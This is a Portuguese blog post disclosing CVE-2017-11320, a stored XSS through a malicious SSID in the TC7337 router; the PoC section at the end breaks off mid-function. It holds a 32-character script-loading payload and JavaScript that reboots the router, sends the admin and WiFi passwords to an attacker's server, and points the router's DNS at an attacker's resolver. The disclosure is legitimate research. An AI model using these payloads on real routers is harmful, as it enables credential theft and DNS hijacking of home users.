<!DOCTYPE html>
<html>
<style>

		@font-face { font-family: "gohu"; src: url("/gohu.woff") format('woff'); }
		body {
			font-family: 'gohu', monospace;
			max-width: 50em;
			margin: 0 auto;
			color: white;
			background: black;
			line-height: calc(1ex / 0.32);
			margin-top: 3em;
		}
		pre {
			font-family: 'gohu', monospace;
			white-space: pre-wrap;
			line-height: 125%;
      background-color: #111;
      padding: 1em;
		}
		@media only screen and (max-width:768px) {
			body {
				max-width:100%;
			}
		}
		a:link {
			color: #0a0 ;
		}
		a:visited {
			color: #004100 ;
		}
		td.linenos .normal { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
		span.linenos { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
		td.linenos .special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
		span.linenos.special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
		.codehilite .hll { background-color: #0000ff }
		.codehilite { background: #000000; }
		.codehilite .c { color: #00ff00 } /* Comment */
		.codehilite .k { color: #ff0000 } /* Keyword */
		.codehilite .ch { color: #00ff00 } /* Comment.Hashbang */
		.codehilite .cm { color: #00ff00 } /* Comment.Multiline */
		.codehilite .cp { color: #e5e5e5 } /* Comment.Preproc */
		.codehilite .cpf { color: #00ff00 } /* Comment.PreprocFile */
		.codehilite .c1 { color: #00ff00 } /* Comment.Single */
		.codehilite .cs { color: #00ff00 } /* Comment.Special */
		.codehilite .kc { color: #ff0000 } /* Keyword.Constant */
		.codehilite .kd { color: #ff0000 } /* Keyword.Declaration */
		.codehilite .kn { color: #ff0000 } /* Keyword.Namespace */
		.codehilite .kp { color: #ff0000 } /* Keyword.Pseudo */
		.codehilite .kr { color: #ff0000 } /* Keyword.Reserved */
		.codehilite .kt { color: #ee82ee } /* Keyword.Type */
		.codehilite .s { color: #87ceeb } /* Literal.String */
		.codehilite .no { color: #7fffd4 } /* Name.Constant */
		.codehilite .nf { color: #ffff00 } /* Name.Function */
		.codehilite .nv { color: #eedd82 } /* Name.Variable */
		.codehilite .sa { color: #87ceeb } /* Literal.String.Affix */
		.codehilite .sb { color: #87ceeb } /* Literal.String.Backtick */
		.codehilite .sc { color: #87ceeb } /* Literal.String.Char */
		.codehilite .dl { color: #87ceeb } /* Literal.String.Delimiter */
		.codehilite .sd { color: #87ceeb } /* Literal.String.Doc */
		.codehilite .s2 { color: #87ceeb } /* Literal.String.Double */
		.codehilite .se { color: #87ceeb } /* Literal.String.Escape */
		.codehilite .sh { color: #87ceeb } /* Literal.String.Heredoc */
		.codehilite .si { color: #87ceeb } /* Literal.String.Interpol */
		.codehilite .sx { color: #87ceeb } /* Literal.String.Other */
		.codehilite .sr { color: #87ceeb } /* Literal.String.Regex */
		.codehilite .s1 { color: #87ceeb } /* Literal.String.Single */
		.codehilite .ss { color: #87ceeb } /* Literal.String.Symbol */
		.codehilite .fm { color: #ffff00 } /* Name.Function.Magic */
		.codehilite .vc { color: #eedd82 } /* Name.Variable.Class */
		.codehilite .vg { color: #eedd82 } /* Name.Variable.Global */
		.codehilite .vi { color: #eedd82 } /* Name.Variable.Instance */
		.codehilite .vm { color: #eedd82 } /* Name.Variable.Magic */
	
</style>
<head>
  <meta charset="UTF-8">
</head>

<body><h1>Roteador TC7337 : DNS Poisoning através de XSS</h1>
<p>1501632000</p>
<p>Outro post em português, e adivinhem! É sobre a NET!</p>
<h4>TL;DR :</h4>
<blockquote>
<p><strong>CVE-2017–11320 </strong>: XSS Persistente através de SSID malicioso permite roubo de credenciais, reboot do roteador e até DNS Poisoning.</p>
</blockquote>
<p>Tudo começou quando a nossa querida NET decidiu bloquear o acesso a qualquer SSH externo, sim não consigo mais acessar nenhum servidor pela porta 22. Qual seria a solução? Ownar o roteador ! Eu consegui ? Até agora não , mas achei esse XSS.</p>
<p>A vulnerabilidade reside na página de scan de redes WiFi próximas [1](wlscanresults.html) que não faz nenhum tipo de filtragem no SSID das mesmas.</p>
<p><img alt="wlscanresults.html" src="img/1__NUahTOrz5MYD__tCnKgM6oQ.png" />
wlscanresults.html<img alt="Sim, isso é a senha dela" src="img/1__oHmdCZm2qTz9BPlw7DtXsg.jpeg" />
Sim, isso é a senha dela</p>
<p>Quando encontrei essa página, logo peguei o celular da minha namorada e subi um HotSpot com SSID <code>‘&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> e PAM ! Alert na cara. Bem legal e tal, mas um alert não é vulnerabilidade. Um grande problema com o SSID é que ele só aceita 32 carácteres, , então como fazer um XSS que realmente faça alguma coisa com só 32 chars ?</p>
<h3>Tamanho importa</h3>
<p>A forma mais fácil de diminuir o payload é carregando o JavaScript externamente utilizando o ‘src’, algo como :</p>
<div class="codehilite"><pre><span></span><code><span class="w">            </span>&#39;&gt;<span class="nt">&lt;script</span><span class="w"> </span><span class="na">src=</span><span class="s">&quot;http://evil.com/&quot;</span><span class="nt">&gt;&lt;/script&gt;</span>
</code></pre></div>

<p>Mas isso tem 42 carácteres :( Note uma das coisas que posso controlar é o nome do domínio. Então fui caçar o menor domínio que consegui encontrar para comprar. depois de DUAS HORA PROCURANDO eu consegui o domínio 6ks.me , um achado. Estamos agora em 40 carácteres, temos que remover 8. Outra idéia foi remover o “http://” , mas o browser vai tentar acessar 192.168.0.1/6ks.me . Me lembro de algum CTF que o que vem antes de “://” sempre especifica o protocolo a ser usado ( como em vnc:// magnet:// etc:// ) , e caso o protocolo não fosse especificado ele usaria o protocolo atual. Assim, consigo remover o “http:” , faltando retirar 3 chars. A barra no final também não é necessária, 2 chars. Para finalizar, a maioria dos browsers não se importa se você não colocar aspas no atributo.<br />
E com <strong>32 chars cravados</strong> :</p>
<div class="codehilite"><pre><span></span><code><span class="w">            </span>&#39;&gt;<span class="nt">&lt;script</span><span class="w"> </span><span class="na">src=</span><span class="s">//6ks.me</span><span class="nt">&gt;&lt;/script&gt;</span>
</code></pre></div>

<p>Agora conseguimos injetar qualquer JavaScript que precisarmos. Mas o que podemos fazer? Podemos utilizar o <a href="https://developer.mozilla.org/pt-BR/docs/Web/API/XMLHttpRequest">XMLHttpRequest</a> para fazer qualquer requisição para o roteador. Fico fuçando o roteador e vendo as requisições que ele faz e vejo que depois de fazer alguma alteração importante ele faz um request para “rebootinfo.cgi” para reiniciar o modem.</p>
<p>Uma coisa interessante é que no código de todas as páginas existe uma variável chamada “sessionKey” :</p>
<div class="codehilite"><pre><span></span><code><span class="w">            </span><span class="k">var</span><span class="w"> </span><span class="n">sessionKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;540153280&#39;</span><span class="p">;</span>
</code></pre></div>

<p>Essa key muda em toda requisição e é passada como parâmetro GET em todos os .cgi , se não for válida ele não realiza a ação. Alguma forma tosca de <a href="https://stackoverflow.com/questions/5207160/what-is-a-csrf-token-what-is-its-importance-and-how-does-it-work#33829607">CSRF Token</a>.</p>
<p>Então antes de fazer a request para “rebootar” o modem, eu preciso fazer outro request para uma página qualquer para pegar a sessionKey. Abaixo o JS à ser injetado no browser :</p>
<div class="codehilite"><pre><span></span><code><span class="n">function</span><span class="w"> </span><span class="n">reboot_router</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">XSS</span><span class="w"> </span><span class="n">reiniciar</span><span class="w"> </span><span class="n">modem</span>
<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="o">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">Por</span><span class="w"> </span><span class="n">quê</span><span class="err">?</span><span class="w"> </span><span class="n">Porque</span><span class="w"> </span><span class="err">é</span><span class="w"> </span><span class="n">divertido</span><span class="w"> </span><span class="n">ver</span><span class="w"> </span><span class="n">um</span><span class="w"> </span><span class="n">XSS</span><span class="w"> </span><span class="n">fazer</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="n">LED</span><span class="w"> </span><span class="n">apagar</span>

<span class="w">    </span><span class="n">xmlhttp</span><span class="o">=</span><span class="n">new</span><span class="w"> </span><span class="n">XMLHttpRequest</span><span class="p">();</span>
<span class="w">    </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;/resetrouter.html&quot;</span><span class="p">,</span><span class="w"> </span><span class="bp">false</span><span class="p">);</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">GET</span><span class="w"> </span><span class="n">na</span><span class="w"> </span><span class="n">interface</span>
<span class="w">    </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">send</span><span class="p">();</span>
<span class="w">    </span><span class="k">var</span><span class="w"> </span><span class="n">w</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="s2">&quot;Key&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">Procurando</span><span class="w"> </span><span class="n">pelo</span><span class="w"> </span><span class="n">sessionKey</span>
<span class="w">    </span><span class="k">var</span><span class="w"> </span><span class="n">sessionKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">slice</span><span class="p">(</span><span class="n">w</span><span class="p">,</span><span class="n">w</span><span class="o">+</span><span class="mi">20</span><span class="p">)</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="o">/</span><span class="s1">&#39;([^&#39;</span><span class="p">]</span><span class="o">+</span><span class="p">)</span><span class="s1">&#39;/)[1] ; // Regex porque a key está dentro de aspas</span>

<span class="w">    </span><span class="n">xmlhttp</span><span class="o">=</span><span class="n">new</span><span class="w"> </span><span class="n">XMLHttpRequest</span><span class="p">();</span>
<span class="w">    </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;/rebootinfo.cgi?sessionKey=&quot;</span><span class="o">+</span><span class="n">sessionKey</span><span class="p">,</span><span class="w"> </span><span class="bp">false</span><span class="p">);</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">Requisita</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">página</span><span class="w"> </span><span class="n">de</span><span class="w"> </span><span class="n">reboot</span><span class="w"> </span><span class="n">com</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">sessionKey</span>
<span class="w">    </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">send</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div>

<p>Fuçando mais um pouco encontro a página backupsettings.cmd que nada mais é um XML com todas as configurações do modem, inclusive a senha do WiFi em Base64 e a senha do Administrador em PlainText. O mais legal é que não precisa da sessionKey.</p>
<div class="codehilite"><pre><span></span><code><span class="n">function</span><span class="w"> </span><span class="n">get_passwords</span><span class="p">(</span><span class="n">attackers_server</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">attackers_server</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servidor</span><span class="w"> </span><span class="n">para</span><span class="w"> </span><span class="n">enviar</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">credenciais</span>
<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="o">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">Pegar</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">senha</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="n">WiFi</span><span class="w"> </span><span class="n">e</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">senha</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="n">administrador</span>
<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">através</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="n">backup</span><span class="w"> </span><span class="n">das</span><span class="w"> </span><span class="n">configurações</span>

<span class="w">    </span><span class="n">xmlhttp</span><span class="o">=</span><span class="n">new</span><span class="w"> </span><span class="n">XMLHttpRequest</span><span class="p">();</span>
<span class="w">    </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;/backupsettings.cmd&quot;</span><span class="p">,</span><span class="w"> </span><span class="bp">false</span><span class="p">);</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">XML</span><span class="w"> </span><span class="n">da</span><span class="w"> </span><span class="n">configuração</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="n">roteador</span>
<span class="w">    </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">send</span><span class="p">();</span>
<span class="w">    </span><span class="k">var</span><span class="w"> </span><span class="n">k</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="s2">&quot;Admin&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">Procurando</span><span class="w"> </span><span class="n">pela</span><span class="w"> </span><span class="n">senha</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="n">Administrador</span>
<span class="w">    </span><span class="k">var</span><span class="w"> </span><span class="n">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="s2">&quot;KeyPassphrase&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">Procurando</span><span class="w"> </span><span class="n">pela</span><span class="w"> </span><span class="n">senha</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="n">WiFi</span>
<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">Adicionando</span><span class="w"> </span><span class="n">uma</span><span class="w"> </span><span class="n">imagem</span><span class="w"> </span><span class="n">na</span><span class="w"> </span><span class="n">página</span><span class="w"> </span><span class="n">atual</span><span class="w"> </span><span class="n">para</span><span class="w"> </span><span class="n">enviar</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">credenciais</span><span class="w"> </span><span class="n">através</span><span class="w"> </span><span class="n">de</span><span class="w"> </span><span class="n">GET</span><span class="w"> </span><span class="n">para</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="n">servidor</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="n">atacante</span>
<span class="w">    </span><span class="n">document</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;&lt;img src=&quot;&#39;</span><span class="o">+</span><span class="n">attackers_server</span><span class="o">+</span><span class="s1">&#39;?net=&#39;</span><span class="o">+</span><span class="w"> </span><span class="n">encodeURIComponent</span><span class="p">(</span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">slice</span><span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="n">k</span><span class="o">+</span><span class="mi">100</span><span class="p">)</span><span class="o">+</span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">slice</span><span class="p">(</span><span class="n">y</span><span class="p">,</span><span class="n">y</span><span class="o">+</span><span class="mi">80</span><span class="p">))</span><span class="o">+</span><span class="s1">&#39;&quot;&gt;&#39;</span><span class="p">);</span><span class="w"> </span>
<span class="p">}</span>
</code></pre></div>

<p>Por fim, mas não menos importante. Alterando o DNS do roteador nós conseguimos <a href="https://en.wikipedia.org/wiki/DNS_spoofing">DNS Poisoning</a>.</p>
<div class="codehilite"><pre><span></span><code><span class="n">function</span><span class="w"> </span><span class="n">dns_poisoning</span><span class="p">(</span><span class="n">attackers_dns</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">attackers_dns</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servidor</span><span class="w"> </span><span class="n">DNS</span><span class="w"> </span><span class="n">malicioso</span>
<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="o">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><span class="w"> </span><span class="n">caralho</span><span class="w"> </span><span class="n">esse</span><span class="w"> </span><span class="n">código</span><span class="w"> </span><span class="n">ta</span><span class="w"> </span><span class="n">muito</span><span class="w"> </span><span class="n">feio</span><span class="p">,</span><span class="w"> </span><span class="n">desculpa</span><span class="w"> </span><span class="n">mundo</span>
<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">Altera</span><span class="w"> </span><span class="n">os</span><span class="w"> </span><span class="n">servidores</span><span class="w"> </span><span class="n">de</span><span class="w"> </span><span class="n">DNS</span><span class="w"> </span><span class="n">para</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="n">atacante</span>

<span class="w">    </span><span class="n">xmlhttp</span><span class="o">=</span><span class="n">new</span><span class="w"> </span><span class="n">XMLHttpRequest</span><span class="p">();</span><span class="w">   </span>
<span class="w">    </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;/rede-dnsv4.html&quot;</span><span class="p">,</span><span class="w"> </span><span class="bp">false</span><span class="p">);</span><span class="w"> </span>
<span class="w">    </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">send</span><span class="p">();</span>
<span class="w">    </span><span class="k">var</span><span class="w"> </span><span class="n">w</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="s2">&quot;Key&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">;</span><span class="w">  </span><span class="o">//</span><span class="w"> </span><span class="n">Procurando</span><span class="w"> </span><span class="n">pelo</span><span class="w"> </span><span class="n">sessionKey</span>
<span class="w">    </span><span class="k">var</span><span class="w"> </span><span class="n">sessionKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">slice</span><span class="p">(</span><span class="n">w</span><span class="p">,</span><span class="n">w</span><span class="o">+</span><span class="mi">20</span><span class="p">)</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="o">/</span><span class="s1">&#39;([^&#39;</span><span class="p">]</span><span class="o">+</span><span class="p">)</span><span class="s1">&#39;/)[1] ; // Regex porque a key está dentro de aspas</span>
<span class="w">    </span><span class="k">var</span><span class="w"> </span><span class="n">i_wanip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="s2">&quot;wanip&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">;</span>
<span class="w">    </span><span class="k">var</span><span class="w"> </span><span class="n">wanip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">slice</span><span class="p">(</span><span class="n">i_wanip</span><span class="p">,</span><span class="n">i_wanip</span><span class="o">+</span><span class="mi">30</span><span class="p">)</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="o">/</span><span class="s1">&#39;([^&#39;</span><span class="p">]</span><span class="o">+</span><span class="p">)</span><span class="s1">&#39;/)[1] ;</span>
<span class="w">    </span><span class="k">var</span><span class="w"> </span><span class="n">i_wansubnet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="s2">&quot;wansubnet&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>
<span class="w">    </span><span class="k">var</span><span class="w"> </span><span class="n">wansubnet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">slice</span><span class="p">(</span><span class="n">i_wansubnet</span><span class="p">,</span><span class="n">i_wansubnet</span><span class="o">+</span><span class="mi">30</span><span class="p">)</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="o">/</span><span class="s1">&#39;([^&#39;</span><span class="p">]</span><span class="o">+</span><span class="p">)</span><span class="s1">&#39;/)[1] ;</span>
<span class="w">    </span><span class="k">var</span><span class="w"> </span><span class="n">i_wangatewayip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="s2">&quot;wangatewayip&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>
<span class="w">    </span><span class="k">var</span><span class="w"> </span><span class="n">wangatewayip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">slice</span><span class="p">(</span><span class="n">i_wangatewayip</span><span class="p">,</span><span class="n">i_wangatewayip</span><span class="o">+</span><span class="mi">30</span><span class="p">)</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="o">/</span><span class="s1">&#39;([^&#39;</span><span class="p">]</span><span class="o">+</span><span class="p">)</span><span class="s1">&#39;/)[1] ;</span>

<span class="w">    </span><span class="n">xmlhttp</span><span class="o">=</span><span class="n">new</span><span class="w"> </span><span class="n">XMLHttpRequest</span><span class="p">();</span>
<span class="w">    </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;/rede-dnsv4.cgi?enblDhcpClnt=0&amp;wanIpAddress=&quot;</span><span class="o">+</span><span class="n">wanip</span><span class="o">+</span><span class="s2">&quot;&amp;wanIfName=wanbridge&amp;wanSubnetMask=&quot;</span><span class="o">+</span><span class="n">wansubnet</span><span class="o">+</span><span class="s2">&quot;&amp;wanIntfGateway=&quot;</span><span class="o">+</span><span class="n">wangatewayip</span><span class="o">+</span><span class="s2">&quot;&amp;dnsPrimary=&quot;</span><span class="o">+</span><span class="n">attackers_dns</span><span class="o">+</span><span class="s2">&quot;&amp;dnsSecondary=&quot;</span><span class="o">+</span><span class="n">attackers_dns</span><span class="o">+</span><span class="s2">&quot;&amp;sessionKey=&quot;</span><span class="o">+</span><span class="n">sessionKey</span><span class="p">,</span><span class="w"> </span><span class="bp">false</span><span class="p">);</span>
<span class="w">    </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">send</span><span class="p">();</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">Fazendo</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">requisiço</span><span class="w"> </span><span class="n">para</span><span class="w"> </span><span class="n">SALVAR</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">novas</span><span class="w"> </span><span class="n">configurações</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="n">DNS</span>

<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">Depois</span><span class="w"> </span><span class="n">de</span><span class="w"> </span><span class="n">salvar</span><span class="p">,</span><span class="w"> </span><span class="n">precisamos</span><span class="w"> </span><span class="n">aplicar</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">configurações</span><span class="p">,</span><span class="w"> </span><span class="n">fuck</span><span class="w"> </span><span class="n">logic</span>

<span class="w">    </span><span class="o">//</span><span class="n">Getting</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">brand</span><span class="w"> </span><span class="n">NEW</span><span class="w"> </span><span class="n">SessionKey</span>
<span class="w">    </span><span class="n">xmlhttp</span><span class="o">=</span><span class="n">new</span><span class="w"> </span><span class="n">XMLHttpRequest</span><span class="p">();</span><span class="w">   </span>
<span class="w">    </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;/rede-dnsv4.html&quot;</span><span class="p">,</span><span class="w"> </span><span class="bp">false</span><span class="p">);</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">GET</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">DNS</span><span class="w"> </span><span class="n">Config</span><span class="w"> </span><span class="n">page</span>
<span class="w">    </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">send</span><span class="p">();</span>
<span class="w">    </span><span class="k">var</span><span class="w"> </span><span class="n">w</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="s2">&quot;Key&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">;</span><span class="w">  </span><span class="o">//</span><span class="w"> </span><span class="n">Procurando</span><span class="w"> </span><span class="n">pelo</span><span class="w"> </span><span class="n">sessionKey</span>
<span class="w">    </span><span class="k">var</span><span class="w"> </span><span class="n">sessionKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">slice</span><span class="p">(</span><span class="n">w</span><span class="p">,</span><span class="n">w</span><span class="o">+</span><span class="mi">20</span><span class="p">)</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="o">/</span><span class="s1">&#39;([^&#39;</span><span class="p">]</span><span class="o">+</span><span class="p">)</span><span class="s1">&#39;/)[1] ; // Regex porque a key está dentro de aspas</span>

<span class="w">    </span><span class="n">xmlhttp</span><span class="o">=</span><span class="n">new</span><span class="w"> </span><span class="n">XMLHttpRequest</span><span class="p">();</span><span class="w">   </span>
<span class="w">    </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;/wandnscfg.cmd?sessionKey=&quot;</span><span class="o">+</span><span class="n">sessionKey</span><span class="p">,</span><span class="w"> </span><span class="bp">false</span><span class="p">);</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">Aplicando</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">confs</span>
<span class="w">    </span><span class="n">xmlhttp</span><span class="o">.</span><span class="n">send</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div>

<h3>PoC</h3>
<div class="codehilite"><pre><span></span><code>//<span class="w"> </span>Vulnerable<span class="w"> </span>URL<span class="w"> </span>:<span class="w"> </span>https://your.rou.ter.ip/wlscanresults.html
//<span class="w"> </span>XSS<span class="w"> </span>through<span class="w"> </span>SSID<span class="w"> </span>:<span class="w"> </span>&#39;&gt;<span class="nt">&lt;script</span><span class="w"> </span><span class="na">src=</span><span class="s">//6ks.me</span><span class="nt">&gt;&lt;/script&gt;</span><span class="w">   </span>(<span class="w"> </span>Exactly<span class="w"> </span>32<span class="w"> </span>bytes<span class="w"> </span>u_u<span class="w"> </span>)
//<span class="w">                             </span>^
//<span class="w">  </span>5char<span class="w"> </span>domains<span class="w"> </span>are<span class="w"> </span>running<span class="w">  </span>|<span class="w">    </span>&#39;src&#39;<span class="w"> </span>does<span class="w"> </span>not<span class="w"> </span>requires<span class="w"> </span>quotes<span class="w"> </span>,<span class="w"> </span>and<span class="w"> </span>passing<span class="w"> </span>the<span class="w"> </span>URL<span class="w"> </span>with<span class="w"> </span>ony<span class="w"> </span>&#39;//&#39;<span class="w"> </span>
//<span class="w">  </span>out,<span class="w"> </span>grab<span class="w"> </span>yours<span class="w"> </span>!<span class="w">          </span>+---&gt;<span class="w"> </span>it<span class="w"> </span>will<span class="w"> </span>cause<span class="w"> </span>the<span class="w"> </span>browser<span class="w"> </span>to<span class="w"> </span>make<span class="w"> </span>the<span class="w"> </span>request<span class="w"> </span>with<span class="w"> </span>the<span class="w"> </span>current<span class="w"> </span>protocol,
//<span class="w">                                   </span>which<span class="w"> </span>is<span class="w"> </span>HTTP<span class="w"> </span>,<span class="w"> </span>duh
//<span class="w"> </span>Below<span class="w"> </span>is<span class="w"> </span>the<span class="w"> </span>content<span class="w"> </span>of<span class="w"> </span>6ks.me
//<span class="w"> </span>index.html<span class="w"> </span>(<span class="w"> </span>which<span class="w"> </span>is<span class="w"> </span>just<span class="w"> </span>a<span class="w"> </span>JavaScript<span class="w"> </span>actually,<span class="w"> </span>but<span class="w"> </span>we<span class="w"> </span>have<span class="w"> </span>to<span class="w"> </span>use<span class="w"> </span>the<span class="w"> </span>index<span class="w"> </span>to<span class="w"> </span>fit<span class="w"> </span>the<span class="w"> </span>32<span class="w"> </span>chars<span class="w"> </span>)<span class="w"> </span>:

function<span class="w"> </span>get_passwords(attackers_server)<span class="w"> </span>{
